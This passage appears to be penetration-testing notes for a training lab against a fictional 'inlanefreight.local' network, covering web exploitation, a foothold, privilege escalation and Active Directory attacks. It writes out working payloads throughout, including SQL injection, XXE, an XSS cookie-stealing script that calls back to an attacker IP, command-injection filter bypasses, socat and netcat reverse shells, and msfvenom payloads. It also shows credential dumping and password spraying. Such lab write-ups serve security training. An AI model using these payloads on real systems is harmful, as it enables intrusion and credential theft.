Saved as a random name like `5351bf7271abaa2267e03c9ef6393f13.php` (random name = harder for a random attacker to stumble onto it). The app rejects `.php` with *"JPG, JPEG, PNG & GIF files are allowed."* — weak client-side validation. In Burp we change the **`Content-Type` header to `image/png`** to disguise the shell, and it uploads successfully to `/uploads/`. Now we run commands through it:

```shell
curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I
# 172.18.0.3   <-- NOT the internal scope, so this is a standalone/container host
```

The IP (`172.18.0.3`) is **not** in the internal scope, so this box is a dead-end for pivoting — but we bag two solid findings: **HTTP Verb Tampering** and **Unrestricted File Upload**.

## 5.5 ir — WordPress LFI + Credential Brute Force

The `ir` (Investor Relations) site is **WordPress**. We scan it with **WPScan**. `-e ap` enumerates all plugins; `-t 500` uses 500 threads.

```shell
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
```

Findings: core is up-to-date (6.0), theme `cbusiness-investment`, and two plugins — `b2i-investor-tools` and the old, vulnerable **`mail-masta`**. Mail Masta has a known **Local File Inclusion (LFI)** bug that lets us read server files via the `pl=` parameter:

```shell
curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
# dumps /etc/passwd  --> LFI confirmed
```

That''s an **LFI** finding. Next we enumerate WordPress **users** (`-e u`) and then **brute-force** a password (`-P` wordlist, `-U` username):

```shell
wpscan -e u -t 500 --url http://ir.inlanefreight.local
# users: ilfreightwp, tom, james, john

wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
# [SUCCESS] ilfreightwp / password1
```

With `ilfreightwp:password1` we log in at `/wp-login.php`, then go to the **Theme Editor** and edit the `404.php` of an **inactive** theme (Twenty Twenty) to paste a PHP web shell — a classic WordPress-to-RCE technique. Finding: **Weak WordPress Admin Credentials**.

```text
http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
```

## 5.6 status — SQL Injection

The `status` log-search site throws a **MySQL error** when we type a single quote `''` — a textbook sign of **SQL Injection**. We can exploit it by hand with a UNION query, or automate it with **sqlmap**.

Manual UNION payload (pulls DB name, user, version):

```sql
'' union select null, database(), user(), @@version -- //
```

For sqlmap, capture the POST request in Burp, save it as `sqli.txt`, and mark the injectable parameter with a `*` (e.g., `searchitem=*`). Then:

```shell
sqlmap -r sqli.txt --dbms=mysql              # confirm injection
sqlmap -r sqli.txt --dbms=mysql --dbs        # list databases -> finds "status"
sqlmap -r sqli.txt --dbms=mysql -D status --tables   # tables: company, users
```

sqlmap confirms multiple injection types (boolean, error, time, UNION). From here you could dump the `users` table. Finding: **SQL Injection** (try it manually too for practice).

## 5.7 support — Blind XSS & Session Hijacking

The `support` ticket portal lets us submit a ticket that a **human admin** will read — perfect for **Blind XSS** (our script runs in the admin''s browser, not ours). First we confirm it fires by injecting a script that calls back to our listener:

```javascript
"><script src=http://10.10.14.15:9000/TESTING_THIS></script>
```

```shell
nc -lvnp 9000     # we get a callback -> XSS confirmed
```

Now we **steal the admin''s cookie**. Create two files on our attack host — `index.php` logs any cookie sent to it, and `script.js` grabs `document.cookie` and sends it to us:

```php
// index.php  -- saves incoming cookies to cookies.txt
<?php
if (isset($_GET[''c''])) {
    $list = explode(";", $_GET[''c'']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER[''REMOTE_ADDR'']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```javascript
// script.js
new Image().src=''http://10.10.14.15:9200/index.php?c=''+document.cookie
```

Start a PHP server and submit a ticket that loads our script:

```shell
sudo php -S 0.0.0.0:9200
```

```javascript
"><script src=http://10.10.14.15:9200/script.js></script>
```

When the admin opens the ticket, we receive their **session cookie** (e.g., `session=fcfaf93...`). Using a browser plugin like **Cookie-Editor**, we paste in the cookie and get redirected to `/dashboard.php` — logged in as admin. Finding: **Cross-Site Scripting (XSS)** — rated **high** because it hijacks an active admin session.

## 5.8 tracking — SSRF to Local File Read (PDF)

The `tracking` site turns our input into a **PDF**. When we put `<script>document.write(''TESTING THIS'')</script>` in the tracking-number box, the text renders in the PDF — meaning **JavaScript executes during PDF generation**. HTML like `<h1>test</h1>` renders too. This is a known class of bug: HTML/JS injection in server-side PDF generators can be escalated to **SSRF / local file read**.

> **"Dealing with the unexpected":** This vuln class wasn''t in the path, but the tester *researched* published write-ups and adapted. That is the real pentester mindset — poke, research similar public findings, and apply them.

Using an `XMLHttpRequest` payload, we make the PDF generator fetch a local file and print it:

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){ document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

The generated PDF shows `/etc/passwd` — **local file read confirmed**. Finding: **SSRF to Local File Read** (high-risk).

## 5.9 vpn — Fortinet Portal

The `vpn` host is a **Fortinet SSL VPN** login portal. We confirm the version isn''t vulnerable to any known exploit. In a real engagement this would be a prime **password-spraying** target (carefully, to avoid lockouts), but weak credential pairs just return *"Access denied."* here. We move on, noting it as a potential spraying target for the future.

## 5.10 gitlab — Misconfigured Instance

Self-hosted **GitLab** instances are often left open. A locked-down instance would require admin approval for sign-ups, allow-lists, or deny-lists. Here, **we can register freely** and browse `/explore` to see projects. We find a project named **`shopdev2.inlanefreight.local`** — a *new subdomain* that the DNS zone transfer never revealed and brute-forcing likely wouldn''t find. Finding: **Misconfigured GitLab Instance** (high-risk). This is a great example of one app leaking the existence of another.

## 5.11 shopdev2 — XML External Entity (XXE) Injection

We add `shopdev2` to `/etc/hosts`, then log into its store with the embarrassingly simple **`admin:admin`** (yes, this happens in production). In the checkout flow (`/cart.php` → `I AGREE`), Burp shows the request body is **XML**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <subtotal>undefined</subtotal>
  <userid>1206</userid>
</root>
```

XML input → test for **XXE Injection**. We define an external entity that reads a local file and reference it in the `userid`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>undefined</subtotal>
    <userid>&xxetest;</userid>
</root>
```

The response prints `/etc/passwd` — **XXE local file read confirmed**. Finding: **XML External Entity (XXE) Injection** (high-risk).

## 5.12 monitoring — Command Injection (Filter Bypass)

The `monitoring` vHost (the hidden one from ffuf) has a `/login.php` that resists weak passwords and SQLi. We brute-force it with **hydra**. The syntax says: brute the `password` field (`^PASS^`), with username `admin`, treating `Invalid Credentials!` as the "failed" marker.

```shell
hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
# login: admin   password: 12qwaszx   (a "keyboard walk" password)
```

Inside is a **restricted command console**. `cat /etc/passwd` and `cd` are blocked, but the `connection_test` button triggers `/ping.php?ip=127.0.0.1`, which runs a real `ping` — a prime **Command Injection** target. There''s a filter, so we beat it step by step:

1. **Operators like `;` and `|` are blocked.** Use the **newline `%0a`** as the injection operator — it''s not blacklisted.
2. **Command words are blacklisted too.** Break the word with **single quotes** (`''i''d` instead of `id`) to slip past the string match.

```shell
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a''i''d"
# ... uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

Command execution as **`webdev`** (note the `adm` group — useful later). Checking IPs shows this host also sits on **`172.16.8.120`** — inside the internal scope! This is our way in.

```shell
curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a''i''fconfig"
# ens192: inet 172.16.8.120  <-- internal network foothold candidate
```

**Spaces are also filtered**, so for anything with arguments we use the **`${IFS}`** environment variable in place of spaces. We read the filter source itself to stop guessing:

```shell
# read ping.php to see exactly what''s filtered
GET /ping.php?ip=127.0.0.1%0a''c''at${IFS}ping.php
```

The source shows blacklisted operators (`& | ; \ / space`) and a long list of blocked words (`whoami, nc, bash, wget, curl, ...`). Most reverse-shell tools are blocked — **but `socat` is not**. We confirm it''s installed:

```shell
GET /ping.php?ip=127.0.0.1%0a''w''h''i''ch${IFS}socat
# /usr/bin/socat
```

`socat` present → we can get a reverse shell (next section). Finding: **Command Injection** (critical — leads to internal foothold).

> **Findings from Section 5:** IDOR, HTTP Verb Tampering, Unrestricted File Upload, Directory Listing, LFI, Weak WordPress Creds, SQL Injection, Stored/Blind XSS, SSRF→File Read, Misconfigured GitLab, XXE, and Command Injection. A huge haul — and command injection on `monitoring` is our door into the internal network.

---

# 6. Initial Access

We have command execution on `monitoring` (the `dmz01` host) but only via single cURL commands. Now we turn that into a **stable interactive shell** and start looting the box. The client''s goal: if we get an internal foothold, push toward **Domain Admin**.

## 6.1 Getting a Reverse Shell with Socat

A **reverse shell** makes the target connect *back* to us, giving us an interactive command line. `socat` is the one tool not blocked by the filter. The base idea is `socat TCP4:<our-ip>:<port> EXEC:/bin/bash`, but we must apply the same filter bypasses (newline `%0a`, single-quote word-splitting, `${IFS}` for spaces) to sneak it through the `ping.php` parameter.

**Step 1 — Start a netcat listener** on our attack host (matching the port in the payload, 8443):

```shell
nc -nvlp 8443
```

**Step 2 — Send the socat payload** through Burp Repeater (note the quoting and `${IFS}`):

```http
GET /ping.php?ip=127.0.0.1%0a''s''o''c''a''t''${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
```

We catch a shell as **`webdev`**:

```shell
id
# uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

## 6.2 Upgrading to a Stable TTY

The first shell is "dumb" — no tab-completion, no `su`/`sudo`/`ssh`, breaks on Ctrl-C. We upgrade to a **fully interactive TTY**. The common quick method is the Python PTY trick; here we use a nicer **socat↔socat** method for a proper terminal.

**Quick method (always good to know):**

```shell
python3 -c ''import pty; pty.spawn("/bin/bash")''
```

**Socat method (better terminal):**

```shell
# On our attack host, start a socat listener that mirrors our real terminal:
socat file:`tty`,raw,echo=0 tcp-listen:4443

# Then run this on the target (delivered via the command injection):
socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

Now we have a stable prompt (`webdev@dmz01`) where `su`, editors, and arrow keys all work.

## 6.3 Reading Audit Logs with aureport (adm group)

Our `id` showed membership in the **`adm`** group, which can read everything in `/var/log`. Linux **audit logs** record commands users typed — including, sometimes, **passwords typed by mistake into the wrong prompt**. `aureport` summarizes those audit logs; the `--tty` report shows keystrokes from terminal sessions.

```shell
aureport --tty | less
# (press q to quit less)
```

The TTY report reveals a user fumbling an authentication — the string **`ILFreightnixadm!`** was typed right after a `su` to `srvadm`. That''s almost certainly the password for the **`srvadm`** user. Credentials harvested: `srvadm:ILFreightnixadm!`.

## 6.4 Switching Users with the Found Credentials

We use **`su`** to become `srvadm` with the password we just found. This is lateral movement to a more useful account on the same host.

```shell
su srvadm
# Password: ILFreightnixadm!
id
# uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
/bin/bash -i      # get an interactive bash prompt
```

We''ve now chained **command injection → socat reverse shell → stable TTY → credential harvest from logs → user switch**. Next we lock in persistence and escalate to root.

---

# 7. Post-Exploitation Persistence

We don''t want to re-do that whole filter-bypass chain every time we reconnect. The goal is a **reliable "save point"** so each test day starts where we left off, plus a backup route in case our borrowed credentials get changed or noticed.

## 7.1 SSH Persistence with Found Credentials

SSH (port 22) is open, and we have `srvadm`''s password, so we just **SSH in directly** for a stable connection. This is far more reliable than re-exploiting the web app each time.

```shell
ssh srvadm@10.129.203.111
# password: ILFreightnixadm!
/bin/bash -i
```

> **Pro tip from the module:** Always have a *backup* way in. Borrowed credentials can be changed (monthly password rotation, or the user noticing). Think ahead — in the real world there are no resets.

## 7.2 Local Privilege Escalation Checks (id & sudo -l)

Before pulling out heavy tools like LinPEAS, always run the **two fastest wins first**: `id` (am I in a powerful group?) and `sudo -l` (what can I run as root without a password?). In the real world, privilege escalation is usually something simple like a `sudo` misconfig — not an exotic kernel exploit.

```shell
sudo -l
# User srvadm may run the following commands on dmz01:
#   (ALL) NOPASSWD: /usr/bin/openssl
```

We can run **`/usr/bin/openssl` as root with no password**. And `openssl` has a **GTFOBins** entry — it can read/write files and spawn shells when run as root.

## 7.3 Abusing sudo openssl (GTFOBins)

**GTFOBins** documents how normal binaries can be abused for privilege escalation. `openssl` run as root can **read any file** via its `enc` (encrypt) subcommand with `-in`. Instead of reading the password hash file (which we''d still have to crack), we grab **root''s SSH private key** — that gives us direct root SSH access, perfect for pivoting.

```shell
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in $LFILE
# -----BEGIN OPENSSH PRIVATE KEY----- ... (root''s private key prints out)
```

> **Why the key, not the hash file?** A private key is *instant* access (no cracking), and it lets us SSH back as **root** to set up all our port-forwards and pivots. Save the key text to a local file immediately.

## 7.4 Establishing Root Persistence via SSH Key

We save root''s key locally, lock down its permissions (SSH refuses keys that are world-readable), and SSH in as **root**.

```shell
# save the key as dmz01_key, then:
chmod 600 dmz01_key
ssh -i dmz01_key root@10.129.203.111
# root@dmz01:~#
```

We now own `dmz01` as **root** with a stable key-based login. This is our **"save point"** and our launchpad into the internal `172.16.8.0/23` network.

---

# 8. Internal Information Gathering

**Progress recap:** external recon → attacked 12 web apps → command injection foothold → harvested creds → escalated to root on `dmz01` → persistence via user password *and* root SSH key. Now we use `dmz01` as a **pivot** to see and attack the internal network we couldn''t reach before.

## 8.1 Setting Up Pivoting — SSH Dynamic Port Forwarding

**Dynamic port forwarding** turns our SSH session into a **SOCKS proxy**, so any tool on our attack host can reach internal IPs *through* `dmz01`. `-D 8081` opens a SOCKS proxy on local port 8081; `-i dmz01_key` uses root''s key.

```shell
ssh -D 8081 -i dmz01_key root@10.129.203.111
```

Confirm the proxy is listening:

```shell
netstat -antp | grep 8081
# tcp 127.0.0.1:8081 ... LISTEN ... ssh
```

Point **ProxyChains** at it by editing `/etc/proxychains.conf` so the last line reads:

```text
socks4  127.0.0.1 8081
```

Test the whole chain by scanning `dmz01`''s internal NIC through the proxy (`-sT` = full TCP connect scan, required through SOCKS):

```shell
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

## 8.2 Setting Up Pivoting — Metasploit Autoroute

**Alternative pivot** using Metasploit. First build a Linux Meterpreter payload, upload it via SCP (we have SSH), run it, then add **autoroute** so Metasploit routes traffic to internal subnets through that session.

**Step 1 — Generate an ELF Meterpreter payload:**

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
```

**Step 2 — Upload and run it** (`-i dmz01_key` for SCP auth):

```shell
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
# on target:
chmod +x shell.elf && ./shell.elf
```

**Step 3 — Catch it** with `multi/handler`, then add routes:

```shell
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.10.14.15
set LPORT 443
exploit
# once Meterpreter opens:
background
use post/multi/manage/autoroute
set SESSION 1
set subnet 172.16.8.0
run
# [+] Route added to subnet 172.16.0.0/255.255.0.0 ...
```

Now Metasploit modules can reach the internal subnets through session 1.

## 8.3 Host Discovery (Ping Sweep)

Now we find **which internal IPs are alive**. Three options shown:

**Metasploit ping sweep:**

```shell
use post/multi/gather/ping_sweep
set rhosts 172.16.8.0/23
set SESSION 1
run
```

**Fast bash one-liner** (run *on* `dmz01`):

```shell
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

**Or** Nmap through ProxyChains (works but very slow). All methods agree — besides `dmz01` (`172.16.8.120`), three hosts are alive:

```text
172.16.8.3     172.16.8.20     172.16.8.50
```

## 8.4 Host Enumeration (Static Nmap)

To port-scan these hosts we upload a **static Nmap binary** to `dmz01` and scan from there (much faster than through the proxy). `--open` shows only open ports; `-iL live_hosts` reads our list of the three IPs.

```shell
./nmap --open -iL live_hosts
```

Reading the results tells us each host''s role:
- **`172.16.8.3`** — open `53/88/389/445/636/464` → a **Domain Controller** (Kerberos + LDAP). Hard to hit directly; set aside for now.
- **`172.16.8.20`** — Windows with **`80/HTTP`** and **`2049/NFS`** open → interesting (NFS often misconfigured). Hostname hints `DEV01`.
- **`172.16.8.50`** — Windows with a non-standard **`8080`** → interesting. This is `MS01`.

## 8.5 AD Quick Hits — SMB NULL Session

Against the DC, a quick win to try is an **SMB NULL session** (anonymous SMB) — if allowed, it can leak the password policy and user list, which would let us password-spray *without* locking accounts. We test with `enum4linux` through ProxyChains (`-U` users, `-P` password policy).

```shell
proxychains enum4linux -U -P 172.16.8.3
```

We learn the domain name (`INLANEFREIGHT`) and its SID, but user and policy enumeration return **`ACCESS_DENIED`** — null sessions are locked down. **Dead end** for now (we could revisit with Kerbrute + a LinkedIn-derived user list in a real engagement, or ASREPRoast if we get valid usernames).

## 8.6 172.16.8.50 — Tomcat Brute Force

Browsing `http://172.16.8.50:8080` shows **Apache Tomcat 10** (no public exploit). We try to brute-force the **Tomcat Manager** login so we could deploy a malicious WAR for code execution. We launch a *proxied* Metasploit (`proxychains msfconsole`) and use the Tomcat login scanner.

```shell
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 172.16.8.50
set stop_on_success true
run
```

No valid login found — **dead end**. (On an *external* test an exposed Tomcat Manager is worth reporting; on an internal one it''s only a finding if weak creds actually let you in.)

## 8.7 172.16.8.20 — DotNetNuke & NFS Pillaging

On `172.16.8.20` we confirm **DotNetNuke (DNN)** — a .NET CMS ("the WordPress of .NET") — via `proxychains curl http://172.16.8.20`, and to browse it in Firefox we set a **SOCKS5 proxy** to `127.0.0.1:8081`. Registration needs admin approval (dead end), so we pivot to the **NFS** share on port 2049.

**Step 1 — List NFS exports** with `showmount` (`-e`):

```shell
proxychains showmount -e 172.16.8.20
# /DEV01 (everyone)    <-- anonymous access!
```

**Step 2 — Mount it.** We can''t mount *through* ProxyChains, but we have **root on `dmz01`**, which can reach `172.16.8.20` directly — so we mount it there:

```shell
# on dmz01 as root:
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cd /tmp/DEV01 && ls
```

**Step 3 — Pillage config files.** Inside a `DNN` subfolder is a **`web.config`** — config files are gold because they often hold credentials:

```shell
cat /tmp/DEV01/DNN/web.config
# <username>Administrator</username>
# <password><value>D0tn31Nuk3R0ck$$@123</value></password>
```

We harvest the DNN admin creds: **`Administrator:D0tn31Nuk3R0ck$$@123`**.

**Bonus — sniff the wire.** Since we''re root on `dmz01`, we run a packet capture in case cleartext creds fly by (`-i` interface, `-s 65535` full packets, `-w` write to file):

```shell
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```

Nothing useful was captured here (quiet DMZ segment), but on a busy user VLAN this often pays off. Findings to note: **Insecure File Shares** and **Sensitive Data on File Shares**.

---

# 9. Exploitation & Privilege Escalation

We now use the pillaged DNN credentials to get **code execution on the Windows `DEV01` host**, escalate to the **SYSTEM** account, and recover credentials that give us our **first domain account**.

## 9.1 Attacking DNN (SQL Console & xp_cmdshell)

Logging into DNN as `Administrator:D0tn31Nuk3R0ck$$@123` gives us the **SuperUser** account. DNN ships with a built-in **SQL console** (Settings page). SQL Server''s `xp_cmdshell` feature runs operating-system commands from SQL, but it is disabled by default, so we turn it on by pasting these lines into the console and clicking **Run Script** (no output usually means success):

```sql
EXEC sp_configure ''show advanced options'', ''1''
RECONFIGURE
EXEC sp_configure ''xp_cmdshell'', ''1''
RECONFIGURE
```

Now operating-system commands run in the form `xp_cmdshell ''<command>''`, e.g. `xp_cmdshell ''whoami''` returns the service account `nt service\mssql$sqlexpress`. This gives us a route to run code and work toward privilege escalation.

## 9.2 Uploading an ASPX Web Shell

As a second route (useful if the SQL console path is blocked), DNN lets an admin **change the allowed upload file extensions**. We add `.asp`/`.aspx` under **Settings → Security → More → More Security Settings → Allowable File Extensions**, then upload an **ASP web shell** at `http://172.16.8.20/admin/file-management`. Right-clicking the uploaded file and choosing **Get URL** gives a link we can browse to run commands. The shell reveals the account holds **`SeImpersonatePrivilege`**, which is the key privilege we need for escalation.

## 9.3 Privilege Escalation with PrintSpoofer (SeImpersonate)

**`SeImpersonatePrivilege`** lets a process impersonate another token, which can be turned into **SYSTEM**-level code execution using a tool such as **PrintSpoofer**. We need two files on the target: `PrintSpoofer64.exe` and `nc.exe`. The easiest delivery is to temporarily allow `.exe` uploads in DNN and upload both into `c:\DotNetNuke\Portals\0`.

**Step 1 — Start a listener** on `dmz01`:

```shell
nc -lnvp 443
```

**Step 2 — Run PrintSpoofer** so it launches `nc.exe` back to us (`-c` runs the given command):

```cmd
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

We catch a shell as **`nt authority\system`** on host `ACADEMY-AEN-DEV01`. Confirm with `whoami` and `hostname`. Reaching SYSTEM here is also our **first foothold inside the Active Directory domain**.


## 9.4 Dumping SAM & LSA Secrets with secretsdump

As SYSTEM we recover stored secrets. First we save the three registry hives that hold the local account database and stored secrets, using `reg save`:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```

Then we temporarily allow `.SAVE` downloads in DNN and pull all three files down through the File Management page to our attack host. Finally, Impacket''s **`secretsdump.py`** parses them offline (`LOCAL` mode, pointing at each saved hive) to reveal the local account hashes and any LSA secrets:

```shell
secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
```

The output gives us several useful things: the local Administrator hash, a cached domain logon for `hporter`, the machine account, and — importantly — a **cleartext secret in the LSA dump (`Gr8hambino!`)**. That cleartext value turns out to belong to the domain user **`hporter`**, giving us our first domain credential pair: **`hporter:Gr8hambino!`**.

We validate the recovered local Administrator hash with **CrackMapExec** (a pass-the-hash check) so we have a reliable way back onto `DEV01`:

```shell
proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <hash>
# ... (Pwn3d!)  -> hash is valid, local admin confirmed
```

Confirm the domain account from our DEV01 shell:

```cmd
net user hporter /dom
# Global Group memberships  *Domain Users
```

> At this point nothing *new* needs reporting here — the whole chain abused built-in functionality, which was only possible because of the **file-share issues** reported earlier. (If we exploited PrintNightmare instead, that would be its own high-risk finding.)

## 9.5 Alternate Method — Reverse Port Forwarding

There are many ways to interact with `DEV01` from our attack host; one worth knowing is **SSH remote/reverse port forwarding**, which lets the target send a shell back to us even though we''re not on the same network — by bouncing through `dmz01`. The lesson here is **versatility**: practice reaching the same host many ways (pass-the-hash, RDP, WinRM, Meterpreter).

**Step 1 — Generate a Windows payload whose callback IP is the pivot (`dmz01`), not us**, because `DEV01` can only reach the pivot directly:

```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443
```

**Step 2 — Start a `multi/handler`** on a *different* local port (7000) than the payload uses:

```shell
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 7000
run
```

**Step 3 — Upload `teams.exe` to DEV01** (via the DNN file manager or SCP→python web server), then set up **SSH remote forwarding** so port 443 on `dmz01` forwards to our handler on 7000 (`-R` = remote forward, `-vN` = verbose, no shell):

```shell
ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN
```

**Step 4 — Run `teams.exe` on DEV01** and catch the Meterpreter session (it appears to come from `127.0.0.1` because of the relay).

> **Caveat:** By default OpenSSH only allows remote-forwarded ports to be reached from the server itself. To let `DEV01` connect to `dmz01:443`, the pivot''s `/etc/ssh/sshd_config` must have **`GatewayPorts yes`** (then `service sshd reload`). That needs root on the pivot and opens a temporary hole — so clear it with the client, note it in the report appendix, and revert it at the end.

With our first domain foothold (`hporter`) and multiple ways onto the hosts, we now turn to the Active Directory environment.

---

# 10. Lateral Movement

With our first domain credential (`hporter:Gr8hambino!`) and a stable shell on `DEV01`, we map the Active Directory and look for a path to Domain Admin. `DEV01` becomes our **staging area** for AD tools.

## 10.1 Running SharpHound & BloodHound

**BloodHound** draws a graph of the whole domain (users, groups, permissions, sessions) so we can *see* attack paths instead of guessing. **SharpHound** is the collector that gathers the data. We upload `SharpHound.exe` via the DNN file manager and run it with `-c All` (all collection methods) since we don''t need to be stealthy.

```cmd
SharpHound.exe -c All
```

This produces a **Zip file** of the collected data, which we download. On our attack host we start the database and GUI, then drag the Zip into BloodHound to analyze it:

```shell
sudo neo4j start
bloodhound
```

Searching for `hporter` and clicking **First Degree Object Control** shows `hporter` has **`ForceChangePassword`** rights over the user **`ssmalls`** — meaning we can reset `ssmalls`''s password. We also spot that **all Domain Users have RDP access to `DEV01`** (finding: *Excessive AD Group Privileges*, medium-risk).

## 10.2 ForceChangePassword with PowerView

`ForceChangePassword` lets us set a new password for `ssmalls` without knowing the old one. We''ll use **PowerView** from an RDP session (easier for PowerShell work). First open RDP through the pivot with **local port forwarding** (`-L` maps our local 13389 → DEV01:3389):

```shell
proxychains nmap -sT -p 3389 172.16.8.20       # confirm RDP is open
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

The `/drive:` option shares a local folder into the session so we can copy tools across. Inside, copy over and load PowerView, then reset the password:

```powershell
copy \\TSCLIENT\home\PowerView.ps1 .
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString ''Str0ngpass86!'' -AsPlainText -Force) -Verbose
```

Confirm from our attack host with CrackMapExec:

```shell
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!
# [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```

> Changing a real user''s password is intrusive — **confirm with the client first** and log it in the report appendix so it can be reverted.

## 10.3 Share Hunting with Snaffler & CrackMapExec

BloodHound shows nothing useful for `ssmalls`, so we **hunt file shares** — a reliable fallback when stuck. **Snaffler** automatically crawls shares and flags interesting files (scripts, configs, keys) so we''re not drowning in noise.

```cmd
copy \\TSCLIENT\home\Snaffler.exe
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

As `hporter` it finds little, so we re-run share enumeration as `ssmalls` — **permissions differ per user, so share hunting is iterative**. To avoid another RDP, we use CrackMapExec''s `spider_plus` module:

```shell
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share ''Department Shares''
cat /tmp/cme_spider_plus/172.16.8.3.json    # review what it found
```

It flags **`IT/Private/Development/SQL Express Backup.ps1`**. We grab it with smbclient (note the quotes around the spaced filename):

```shell
proxychains smbclient -U ssmalls ''//172.16.8.3/Department Shares''
# cd IT\Private\Development\  then:  get "SQL Express Backup.ps1"
```

The script has **hardcoded credentials for `backupadm`** (another keyboard-walk password — a pattern in this org). We also find a `.vbs` script on **SYSVOL** (readable by all Domain Users) holding an old credential `account:L337^p@$$w0rD` (likely stale, based on the 2011/2015 comments, but worth noting for spraying). Finding: **Sensitive Data on File Shares**.

## 10.4 Kerberoasting

**Kerberoasting** requests Kerberos service tickets for accounts that have a Service Principal Name (SPN); those tickets are encrypted with the service account''s password hash, which we can crack offline. We enumerate SPN accounts with PowerView and export their tickets in Hashcat format:

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Select samaccountname
Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

Copy the CSV back (`copy .\ilfreight_spns.csv \\Tsclient\Home`), pull the hashes out, and crack with **Hashcat** mode `13100` (Kerberos TGS-REP) against `rockyou.txt`:

```shell
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
```

One hash cracks, but BloodHound shows that account isn''t useful to us. Still worth the finding: **Weak Kerberos Authentication Configuration (Kerberoasting)**.

## 10.5 Password Spraying

**Password spraying** tries *one* common password against *many* users (the reverse of brute-forcing), which avoids lockouts. We use `Invoke-DomainPasswordSpray` from DEV01:

```powershell
Invoke-DomainPasswordSpray -Password Welcome1
# [*] SUCCESS! User:kdenunez Password:Welcome1
# [*] SUCCESS! User:mmertle Password:Welcome1
```

Two users use `Welcome1`, though neither has interesting access. Finding: **Weak Active Directory Passwords Allowed**.

## 10.6 Misc Techniques (GPP, Descriptions)

A couple more quick checks to cover all bases. **GPP autologin**: Group Policy sometimes stores autologon passwords in `Registry.xml` on SYSVOL — CrackMapExec''s `gpp_autologin` module finds them:

```shell
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
```

Nothing here. **Passwords in AD Description fields**: admins sometimes stash passwords in a user''s Description — uncommon but we''ve even seen Domain Admin passwords this way:

```powershell
Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
# frontdesk   ILFreightLobby!
```

We find one (`frontdesk`), not directly useful, but a valid finding: **Passwords in AD User Description Field**.

## 10.7 WinRM Access + unattend.xml + Sysax PrivEsc

Going back to basics, we scan for **WinRM** (port 5985) and try each credential set. `MS01` (`172.16.8.50`) answers, and **`backupadm`** logs in with **evil-winrm**:

```shell
proxychains nmap -sT -p 5985 172.16.8.50
proxychains evil-winrm -i 172.16.8.50 -u backupadm
# *Evil-WinRM* PS C:\Users\backupadm\Documents> hostname  -> ACADEMY-AEN-MS01
```

> **Kerberos "Double Hop":** from this WinRM shell, AD enumeration needs a **PSCredential object** (the shell can''t forward our creds a second hop).

